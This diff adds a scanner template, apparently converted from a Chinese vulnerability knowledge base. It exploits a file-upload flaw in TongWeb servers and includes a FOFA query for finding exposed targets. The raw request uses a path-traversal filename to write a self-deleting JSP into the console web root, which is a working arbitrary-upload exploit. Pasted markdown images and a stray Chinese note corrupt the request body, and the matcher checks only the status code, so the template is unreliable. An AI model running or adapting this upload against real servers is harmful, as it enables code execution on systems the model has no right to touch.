@@ -1,0 +1,51 @@
+id: poc-vbv5m0s1mm120w1f
+info:
+  name: 东方通 upload存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vbv5m0s1mm120w1f'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vbv5m0s1mm120w1f
+    fofa: 'banner="Server: TongWeb Server" || header="Server: TongWeb Server"'
+http:
+- raw:
+  - 'POST /heimdall/deploy/upload?method=upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs
+
+    Content-Disposition: form-data; name="file"; filename="../../applications/console/css/123.jsp"
+
+
+    <%
+
+    out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+
+    new java.io.File(application.getRealPath(request.getServletPath())).delete();
+
+    %>
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413386991-761da63f-63e5-4d3c-87dd-d7c466d623f3.png)
+
+    上传定位：GET /console/css/123.jsp HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413387200-79ba5e2a-e62b-405b-8ae4-972df94ab586.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
